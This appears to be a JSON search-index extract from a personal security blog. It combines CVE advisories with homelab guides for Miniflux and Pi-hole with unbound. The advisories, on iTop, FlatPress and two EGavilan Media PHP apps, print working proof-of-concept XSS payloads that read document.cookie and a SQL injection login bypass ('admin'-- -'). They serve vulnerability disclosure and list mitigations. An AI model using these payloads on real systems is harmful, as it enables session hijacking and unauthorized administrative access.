\u0026lt; 3.1.1 in the ajax.render.php endpoint. Several query parameters are improperly sanitized, allowing attackers to inject malicious JavaScript code that is reflected in the response and executed in the context of the victim\u0026rsquo;s browser.\nReflected XSS vulnerabilities enable attackers to craft malicious links that, when visited by an authenticated user, trigger arbitrary JavaScript execution. This can lead to session hijacking, information theft, or manipulation of user interactions.\nAffected Parameters The following parameters in the ajax.render.php endpoint are vulnerable:\nparams[order_by] params[limit] params[order_direction] params[group_by_label] params[currentId] CVSS v3.1 Metrics Metric Value Base Score 6.1 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Authenticated access is required. Replace \u0026lt;TARGET\u0026gt; with your domain or IP and ensure /itop/ is present in the path.\nTesting Environment iTop version: 3.1.0-2-11973 (built on 2023-08-02 14:25:30) MySQL: 10.3.38-MariaDB-0ubuntu0.20.04.1 PHP: 7.4.3-4ubuntu2.19 Browsers used for testing: Brave 1.58.137 (Chromium 117.0.5938.153) – 64-bit Firefox 118.0.1 – 64-bit PoC #1: params[order_by] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[order_direction]=desc PoC #2: params[limit] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026lt;/ScriPt\u0026gt;\u0026lt;sCripT id=xss-test\u0026gt;alert(document.cookie)\u0026lt;/sCriPt\u0026gt;\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc PoC #3: params[order_direction] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39; PoC #4: params[group_by_label] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc PoC #5: params[currentId] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://github.com/Combodo/iTop https://github.com/Combodo/iTop/security/advisories/GHSA-q9cm-q7fc-frxh https://www.cve.org/CVERecord?id=CVE-2023-47622 https://nvd.nist.gov/vuln/detail/CVE-2023-47622 https://portswigger.net/web-security/cross-site-scripting/reflected https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2023-47622/","summary":"Vulnerability Summary A Reflected Cross-Site Scripting (XSS) vulnerability exists in Combodo iTop version \u0026lt; 3.0.4 and \u0026gt;= 3.1.0, \u0026lt; 3.1.1 in the ajax.render.php endpoint. Several query parameters are improperly sanitized, allowing attackers to inject malicious JavaScript code that is reflected in the response and executed in the context of the victim\u0026rsquo;s browser.\nReflected XSS vulnerabilities enable attackers to craft malicious links that, when visited by an authenticated user, trigger arbitrary JavaScript execution.","title":"CVE-2023-47622: Multiple Reflected Cross-Site Scripting Vulnerabilities in IT Service Management Platform iTop"},{"content":"Introduction In recent years, I\u0026rsquo;ve adopted the practice of exploring Privacy Guides and gradually, step by step, substituting proprietary technologies that disregard our privacy with open-source, privacy-respecting alternatives. In this blog post, we will expand our homelab with a minimalist news aggregator known as Miniflux. We\u0026rsquo;ll implement this solution on a Raspberry Pi 4 Model B with 4GB of RAM, running the Raspberry Pi OS Lite.\nThis blog post is structured into four sections: \u0026ldquo;Prerequisites\u0026rdquo; which covers requirements that must be met before we can successfully install and use, \u0026ldquo;Installation\u0026rdquo; providing a step-by-step guide for implementation, \u0026ldquo;Miniflux Usage\u0026rdquo;, and \u0026ldquo;Resources\u0026rdquo; offering supplementary materials. These sections simplify your path from prerequisites to installation, offering valuable resources to aid your exploration.\nPrerequisites Miniflux feed reader provides multiple installation methods, including package installation, Docker container deployment, and manual setup. In our case, we selected Docker due to its user-friendly configuration.\nIf you\u0026rsquo;ve previously installed Docker packages through unofficial distributions in APT, it\u0026rsquo;s necessary to remove these packages before installing the official Docker Engine version. To do this, execute the following command.\nfor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done To install via the APT repository, begin by configuring the Docker APT repository. Following that, you can install and update Docker directly from the repository.\nSet up Docker\u0026rsquo;s APT repository. sudo apt-get update sudo apt-get install ca-certificates curl gnupg sudo install -m 0755 -d /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/raspbian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg sudo chmod a+r /etc/apt/keyrings/docker.gpg echo \\ \u0026#34;deb [arch=\u0026#34;$(dpkg --print-architecture)\u0026#34; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/raspbian \\ \u0026#34;$(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;)\u0026#34; stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null sudo apt-get update Install the Docker packages. sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin To grant the current user permission to execute docker and, consequently, initiate containers, you need to add them in the docker user group. To make the group change effective, you can either log out and log back in or use the su command.\nsudo usermod -aG docker $USER \u0026amp;\u0026amp; su $USER Installation We will create directory miniflux directory within our home directory using the following command.\nmkdir ~/miniflux You can find a Docker Compose example file on Miniflux\u0026rsquo;s website, and additional examples featuring Traefik and Caddy are available in the project\u0026rsquo;s GitHub repository. For our demonstration, we will use the basic.yml from the mentioned repository. To download this file, execute the following command.\nwget https://raw.githubusercontent.com/miniflux/v2/main/contrib/docker-compose/basic.yml -O ~/miniflux/docker-compose.yml Remember to customize the default password and make any other necessary configurations within the downloaded Docker Compose file, which we have named docker-compose.yml in the previous command.\nRunning the subsequent command will fetch the Docker containers for Miniflux.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux pull With the following command we will start Miniflux Docker containers.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux up -d To obtain a continuous stream of log output from all services and verify a successful build, run the following command.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux logs -f Miniflux Usage You can now access your Miniflux instance at the endpoint determined by your configuration in the ~/miniflux/docker-compose.yml file . For instance, in my setup, I have configured it to operate on port 8080. Thus, visiting http://192.168.100:8080/ will take me to the login portal. Once you input valid user credentials, you will be shown the minimalist Miniflux interface.\nFor a comprehensive user guide covering interface usage, available keyboard shortcuts, filter, rewrite and scraper rules as well as third-party applicationsyou can refer to the official Miniflux website.\nResources Miniflux Website: https://miniflux.app/index.html Miniflux Repository: https://github.com/miniflux Docker Engine Installation on Raspberry Pi: https://docs.docker.com/engine/install/raspberry-pi-os/ Docker Compose Example: https://miniflux.app/docs/dacker.html More Docker Compose Examples: https://github.com/miniflux/v2/tree/main/contrib/docker-compose Miniflux Interface Usage: https://miniflux.app/docs/ui.html Miniflux Keyboard Shortcuts: https://miniflux.app/docs/keyboard_shortcuts.html Miniflux Filter, Rewrite and Scraper Rules: https://miniflux.app/docs/rules.html Miniflux Support for Third-Party Applications: https://miniflux.app/docs/apps.html Thank you for reading, and if you like this post, please consider adding my website to your RSS feed.\n","permalink":"https://martinkubecka.sk/posts/2023-09-23-news-aggregator/","summary":"Introduction In recent years, I\u0026rsquo;ve adopted the practice of exploring Privacy Guides and gradually, step by step, substituting proprietary technologies that disregard our privacy with open-source, privacy-respecting alternatives. In this blog post, we will expand our homelab with a minimalist news aggregator known as Miniflux. We\u0026rsquo;ll implement this solution on a Raspberry Pi 4 Model B with 4GB of RAM, running the Raspberry Pi OS Lite.\nThis blog post is structured into four sections: \u0026ldquo;Prerequisites\u0026rdquo; which covers requirements that must be met before we can successfully install and use, \u0026ldquo;Installation\u0026rdquo; providing a step-by-step guide for implementation, \u0026ldquo;Miniflux Usage\u0026rdquo;, and \u0026ldquo;Resources\u0026rdquo; offering supplementary materials.","title":"Self Hosting News Aggregator"},{"content":"Vulnerability Summary An SQL injection vulnerability exists in the login form of the Resumes Management and Job Application Website application by EGavilan Media. This vulnerability allows unauthenticated attackers to bypass authentication and gain administrative access.\nA SQL Injection attack consists of inserting an SQL query through client-supplied input into the application\u0026rsquo;s backend query. If improperly sanitized, the attacker may read or modify sensitive data, escalate privileges, or execute system-level commands.\nCVSS v3.1 Metrics Metric Value Base Score 9.8 (CRITICAL) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Weakness Enumeration CWE ID Description CWE-89 Improper Neutralization of Special Elements used in an SQL Command (\u0026lsquo;SQL Injection\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Download, install, and run the Resumes Management and Job Application Website application. Navigate to: http://localhost/login.html Enter the following credentials in the login form: Username: admin'-- - Password: any value Click the Login button. This results in a successful authentication bypass and grants unauthorized access.\nSuggested Mitigations Use prepared statements with parameterized queries. Implement stored procedures for database operations. Apply allow-list input validation on all user input. Escape and sanitize all user-supplied input before processing. References https://github.com/EGavilan-Media/Resumes-Management-and-Job-Application-Website-with-PHP-Bootstrap-and-MySQL https://www.cve.org/CVERecord?id=CVE-2021-41433 https://nvd.nist.gov/vuln/detail/CVE-2021-41433 https://portswigger.net/web-security/sql-injection https://portswigger.net/support/using-sql-injection-to-bypass-authentication ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41433/","summary":"Vulnerability Summary An SQL injection vulnerability exists in the login form of the Resumes Management and Job Application Website application by EGavilan Media. This vulnerability allows unauthenticated attackers to bypass authentication and gain administrative access.\nA SQL Injection attack consists of inserting an SQL query through client-supplied input into the application\u0026rsquo;s backend query. If improperly sanitized, the attacker may read or modify sensitive data, escalate privileges, or execute system-level commands.","title":"CVE-2021-41433: Authentication Bypass in Resumes Management by EGavilan Media"},{"content":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.2.1 of the FlatPress application. This vulnerability allows an authenticated attacker to inject malicious JavaScript code into blog content, which will execute in the context of any user visiting the affected page.\nStored XSS occurs when user-supplied input is stored on the server (e.g., in a database or file system) and later rendered in a web page without proper encoding or sanitization. This can lead to session hijacking, defacement, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.4 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Log in to the FlatPress administration area. Navigate to Entries → Write Entry. Enter any value in the Subject field. In the Content area, insert the following payload: \u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; Click the Save \u0026amp; Continue button. The stored XSS payload is now saved and will be executed whenever the post is viewed. Navigate to the FlatPress homepage to verify the execution of the payload. Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://flatpress.org/ https://www.cve.org/CVERecord?id=CVE-2021-41432 https://nvd.nist.gov/vuln/detail/CVE-2021-41434 https://portswigger.net/web-security/cross-site-scripting/stored https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41432/","summary":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.2.1 of the FlatPress application. This vulnerability allows an authenticated attacker to inject malicious JavaScript code into blog content, which will execute in the context of any user visiting the affected page.\nStored XSS occurs when user-supplied input is stored on the server (e.g., in a database or file system) and later rendered in a web page without proper encoding or sanitization.","title":"CVE-2021-41432: Stored Cross-Site Scripting Vulnerability in the Blog Content in FlatPress"},{"content":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.0 of the Expense Management System application by EGavilan Media that allows for arbitrary execution of JavaScript commands.\nStored XSS vulnerabilities enable attackers to store malicious scripts in a target application. These scripts are then served to users who view the stored data, potentially leading to session hijacking, credential theft, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.4 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Download, install, and run the Expense Management System application (version 1.0). Navigate to: http://localhost/index.php Click on Add Expense and fill out the form as follows: Description: \u0026lt;script\u0026gt;alert(document.cookie);\u0026lt;/script\u0026gt; Amount: any numeric value Date: any valid date Press the Save button. Navigate to the page displaying the newly added expense. The JavaScript payload will execute from the description field. Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://github.com/EGavilan-Media/Expense-Management-System https://www.cve.org/CVERecord?id=CVE-2021-41434 https://nvd.nist.gov/vuln/detail/CVE-2021-41434 https://portswigger.net/web-security/cross-site-scripting/stored https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41434/","summary":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.0 of the Expense Management System application by EGavilan Media that allows for arbitrary execution of JavaScript commands.\nStored XSS vulnerabilities enable attackers to store malicious scripts in a target application. These scripts are then served to users who view the stored data, potentially leading to session hijacking, credential theft, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.","title":"CVE-2021-41434: Stored Cross-Site Scripting Vulnerability in Expense Management System by EGavilan Media"},{"content":"Introduction Unbound is a validating, recursive, caching open-source DNS resolver primarily developed by NLnet Labs, VeriSign Inc., Nominet, and Kirei. To help increase our online privacy, unbound supports DNS-over-TLS and DNS-over-HTTPS which allows clients to encrypt their communication. Unbound runs on FreeBSD, OpenBSD, NetBSD, MacOS, Linux and Microsoft Windows, with packages available for most platforms.\nThis guide is intended for unbound installation in conjunction with Pi-hole and therefore Pi-hole is the only prerequisite.\nThe Pi-hole is a DNS sinkhole that protects your devices from unwanted content, without installing any client-side software. (documentation)\nYou can install and configure Pi-hole with the command below on any distribution which utilizes systemd or sysvinit. To verify if your distribution is supported, check out Supported Operating Systems section in the Pi-hole documentation. This guide will not go through the Pi-hole installation steps.\n$ curl -sSL https://install.pi-hole.net | bash Personal setup We decided to install unbound on a dedicated system connected directly to our router via ethernet. Here is the complete list of hardware and accessories we have used for this project:\nRaspberry Pi 4 Model B (4GB RAM) OS : Raspberry Pi OS Lite (32-bit) Raspberry Pi 15W USB-C Power Supply Flirc Raspberry Pi 4 Case SanDisk micro SDHC 32 GB Extreme Pro If you are familiar with how does DNS and unbound work, feel free to skip to the Installation section.\nHow does it actually work? In this section, we will learn how does DNS work, what is the difference between recursive and iterative DNS resolver, how does unbound work and what are the pros and the cons of running your own recursive DNS resolver at home.\nHow does DNS actually work? After a user types a domain name (e.g. \u0026ldquo;thehackernews.com\u0026rdquo;) into their browser, DNS lookup is triggered. A group of DNS servers then help to find the IP address for the domain and return it back to the user\u0026rsquo;s computer.\nBecause we will be installing and setting up unbound as a recursive DNS resolver, let\u0026rsquo;s talk about the difference between recursive and iterative DNS resolver.\nRecursive DNS resolver is a middleman between a client (you) and a DNS nameserver. This type of a DNS resolver is recursively querying other DNS servers until it has an IP address for the requested domain, which is returned to the client. If a DNS resolver has already performed the same query in the recent past, this DNS query is cached and when performed again, our resolver respond to us with the cashed data instead of querying other DNS servers.\nHere are other DNS servers that are queried when using a recursive DNS resolver:\nDNS root nameserver responds by directing the recursive resolver to a TLD nameserver, based on the extension of that domain (.com, .net, .org, etc.) DNS TLD nameserver maintains information for all the domain names that share a common domain extension (.com, .net, .org, etc.) DNS authoritative nameserver contains information specific to the domain name it serves and it also provides a recursive resolver with the IP address of that server found in the DNS A record if the domain has a CNAME record it will provide the recursive resolver with an alias domain which means the recursive resolver will have to perform a new DNS lookup for this record Let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a recursive DNS resolver.\nOn the other hand, when using an iterative DNS resolver client will allow a DNS server to return the best answer it can. If the queried DNS server does not have a match for the query name, it will return a referral to a DNS server authoritative for a lower level of the domain namespace. The DNS client will then make a query to the referral address. This process continues with additional DNS servers down the query chain until either an error or timeout occurs.\nNow let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a iterative DNS resolver.\nHow does unbound work? In a few steps below, we will describe what are the differences when running only a Pi-hole and a Pi-hole with unbound.\nStandard Pi-hole configuration:\nClient asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the configured upstream DNS (usually it is default one from your ISP) When Pi-hole receives the answer, it will reply to a client with the answer. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain. Pi-hole setup with unbound as a local recursive DNS resolver:\nClient asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the local recursive DNS resolver = unbound. Unbound will send a query to the DNS root servers asking who is handling .com . The root server answers with a referral to the TLD (Top level domain) server for .com . Unbound will send a query to one of the TLD DNS server for .com asking who is handling domain.com . The TLD server answers with a referral to the authoritative name servers for domain.com . Unbound will send a query to the authoritative name servers asking what is the IP for domain.com . The authoritative server will answer with the IP address of the domain domain.com . Unbound will send the reply to Pi-hole which will reply with the answer to a client. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain. Pros and Cons Pros Privacy : Directly contacting the responsive servers means that no server can fully log the exact paths you\u0026rsquo;re going (e.g. Google DNS servers will only be asked if you want to visit a Google website). Cons When traversing the path for the first, especially visiting a website for the first time, it may be slower than when we are using big DNS providers which have answers for common used domains cached. The first request to a formerly unknown TLD may take up to a second. Subsequent requests to domains under the same TLD usually complete in \u0026lt; 0.1s. Fortunately, our setup will be configured for efficient caching to minimize the number of queries that will actually have to be performed. Installation Unbound can be simply installed from a package manager with the command below, if you are using apt as a package manager.\n$ sudo apt install unbound Or you can download unbound from Github and then compile and install it with the following command.\n$ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install If you are not installing unbound from a package manager, you have to download the current root hints file (list of primary root servers). After downloading this file, you will need to uncomment the root-hints: configuration line in the suggested config file provided below.\n$ wget https://www.internic.net/domain/named.root -qO- | sudo tee /var/lib/unbound/root.hints\nAdd a cronjob or run this command roughly every six months to update the root.hints file.\nConfiguration Now we need to create a config file called pi-hole.conf in /etc/unbound/unbound.conf.d/ directory. Run the following command to create such a file and then copy the content of suggested config file provided to us from an official unbound documentation.\n$ sudo nano /etc/unbound/unbound.conf.d/pi-hole.conf Suggested config file\n# Unbound config file server: # If no logfile is specified, syslog is used # logfile: \u0026#34;/var/log/unbound/unbound.log\u0026#34; verbosity: 0 interface: 127.0.0.1 port: 5335 do-ip4: yes do-udp: yes do-tcp: yes # May be set to yes if you have IPv6 connectivity do-ip6: no # You want to leave this to no unless you have *native* IPv6. With 6to4 and # Terredo tunnels your web browser should favor IPv4 for the same reasons prefer-ip6: no # Use this only when you downloaded the list of primary root servers! # If you use the default dns-root-data package, unbound will find it automatically #root-hints: \u0026#34;/var/lib/unbound/root.hints\u0026#34; # Trust glue only if it is within the server\u0026#39;s authority harden-glue: yes # Require DNSSEC data for trust-anchored zones, if such data is absent, the zone becomes BOGUS harden-dnssec-stripped: yes # Don\u0026#39;t use Capitalization randomization as it known to cause DNSSEC issues sometimes # see https://discourse.pi-hole.net/t/unbound-stubby-or-dnscrypt-proxy/9378 for further details use-caps-for-id: no # Reduce EDNS reassembly buffer size. # IP fragmentation is unreliable on the Internet today, and can cause # transmission failures when large DNS messages are sent via UDP. Even # when fragmentation does work, it may not be secure; it is theoretically # possible to spoof parts of a fragmented DNS message, without easy # detection at the receiving end. Recently, there was an excellent study # \u0026gt;\u0026gt;\u0026gt; Defragmenting DNS - Determining the optimal maximum UDP response size for DNS \u0026lt;\u0026lt;\u0026lt; # by Axel Koolhaas, and Tjeerd Slokker (https://indico.dns-oarc.net/event/36/contributions/776/) # in collaboration with NLnet Labs explored DNS using real world data from the # the RIPE Atlas probes and the researchers suggested different values for # IPv4 and IPv6 and in different scenarios. They advise that servers should # be configured to limit DNS messages sent over UDP to a size that will not # trigger fragmentation on typical network links. DNS servers can switch # from UDP to TCP when a DNS response is too big to fit in this limited # buffer size. This value has also been suggested in DNS Flag Day 2020. edns-buffer-size: 1232 # Perform prefetching of close to expired message cache entries # This only applies to domains that have been frequently queried prefetch: yes # One thread should be sufficient, can be increased on beefy machines. In reality for most users running on small networks or on a single machine, it should be unnecessary to seek performance enhancement by increasing num-threads above 1. num-threads: 1 # Ensure kernel buffer is large enough to not lose messages in traffic spikes so-rcvbuf: 1m # Ensure privacy of local IP ranges private-address: 192.168.0.0/16 private-address: 169.254.0.0/16 private-address: 172.16.0.0/12 private-address: 10.0.0.0/8 private-address: fd00::/8 private-address: fe80::/10 After saving pi-hole.conf configuration file, we will start our local DNS recursive server with the command below.\n$ sudo service unbound restart Testing DNS lookup Finally, we will test our unbound recursive DNS resolver with a dig command querying a DNS record for a pi-hole.net domain. Notice status value NOERROR and the IP address for our requested domain.\n$ dig pi-hole.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; pi-hole.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 6970 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;pi-hole.net. IN A ;; ANSWER SECTION: pi-hole.net. 300 IN A 3.18.136.52 ;; Query time: 19 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:41:51 CET 2022 ;; MSG SIZE rcvd: 56 Testing DNSSEC Last step before changing our network settings will be testing DNSSEC validation using once again dig command.\nThe first command should give us a status report of SERVFAIL and no IP address.\n$ dig sigfail.verteiltesysteme.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigfail.verteiltesysteme.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: SERVFAIL, id: 22604 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;sigfail.verteiltesysteme.net. IN A ;; Query time: 299 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:03:00 CET 2022 ;; MSG SIZE rcvd: 57 The second command should give us NOERROR and IP address.\n$ dig sigok.verteiltesysteme.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigok.verteiltesysteme.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 64024 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;sigok.verteiltesysteme.net. IN A ;; ANSWER SECTION: sigok.verteiltesysteme.net. 60 IN A 134.91.78.139 ;; Query time: 29 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:03:15 CET 2022 ;; MSG SIZE rcvd: 71 Pi-hole settings In your Pi-hole web console, navigate to the Settings, then DNS. Make sure to uncheck all upstream DNS servers.\nNow, scroll down to the second Upstream DNS Servers section and specify 127.0.0.1#5335 as the Custom DNS (IPv4). This means that your Pi-hole will use your recursive DNS server provided by unbound.\nAt last, scroll all the way down and save your settings. After pressing the Save button you should see a pop up Info window\nValidating our setup At the time of writing this post, we have been running Pi-hole with unbound for almost 24 hours. We are able to validate that our configuration works from the Upstream servers pie chart, where 65% of all the DNS queries were handled by our local recursive DNS resolver and 20% were cached queries. Remaining 15% of DNS queries were handled by our preconfigured Quad9 upstream server and other public resolver while we were configuring local recursive DNS resolver unbound.\nResources Pi-hole - documentation : https://docs.pi-hole.net/ unbound - about : https://nlnetlabs.nl/projects/unbound/about/ unbound - install : https://docs.pi-hole.net/guides/dns/unbound/ What is DNS? : https://www.cloudflare.com/learning/dns/what-is-dns/ What is recursive DNS? : https://www.cloudflare.com/learning/dns/what-is-recursive-dns/ DNS server types : https://www.cloudflare.com/learning/dns/dns-server-types/ Thank you for reading and we hope you learned something new._\n","permalink":"https://martinkubecka.sk/posts/2022-01-28-resursive-dns/","summary":"Introduction Unbound is a validating, recursive, caching open-source DNS resolver primarily developed by NLnet Labs, VeriSign Inc., Nominet, and Kirei. To help increase our online privacy, unbound supports DNS-over-TLS and DNS-over-HTTPS which allows clients to encrypt their communication. Unbound runs on FreeBSD, OpenBSD, NetBSD, MacOS, Linux and Microsoft Windows, with packages available for most platforms.\nThis guide is intended for unbound installation in conjunction with Pi-hole and therefore Pi-hole is the only prerequisite.","title":"Setting Up Your Own Recursive DNS 